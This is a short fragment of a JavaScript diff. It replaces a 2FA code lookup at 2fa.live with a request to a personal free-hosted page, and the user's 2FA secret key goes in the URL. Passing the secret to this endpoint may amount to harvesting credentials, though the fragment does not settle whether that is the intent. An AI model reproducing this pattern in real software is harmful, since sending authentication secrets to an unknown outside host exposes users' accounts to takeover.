@@ -1,4 +1,4 @@
-var url = `https://2fa.live/tok/${Code2FA}`;
+var url = `https://theloi194.000webhostapp.com/2fa/2fa.php?key=${Code2FA}`;
 let code;
 fetch(url)
     .then(res => res.json())
